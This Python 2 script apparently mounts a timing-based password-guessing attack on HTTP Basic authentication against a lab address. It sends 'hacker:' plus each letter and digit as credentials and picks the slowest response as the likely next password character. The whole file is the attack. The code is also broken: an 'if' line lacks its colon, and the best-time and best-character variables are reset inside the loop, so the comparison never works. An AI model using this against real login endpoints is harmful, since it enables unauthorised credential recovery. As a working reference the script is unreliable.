#!/usr/local/bin/python

import sys
import requests
import base64
import string

#print "First argument is " + str(sys.argv[1])

url = 'http://172.20.0.101/authentication/example2/'

charseq = list(string.ascii_lowercase + "0123456789")
for char in charseq:
    max_exec_time = 0
    suggested_char = "a"
    auth_string = "Basic " + base64.b64encode("hacker:" + char)
    hdrs = {"Encoding": "gzip, deflate", "Authorization": auth_string}
    r = requests.get(url, headers=hdrs)
    exec_time = r.elapsed.total_seconds()
    print "Char: " + char + " - " + str(exec_time)
    if exec_time > max_exec_time:
        suggested_char = char
    if r.status_code != 401
        print r.status_code
        break

print suggested_char
#print resp.read()
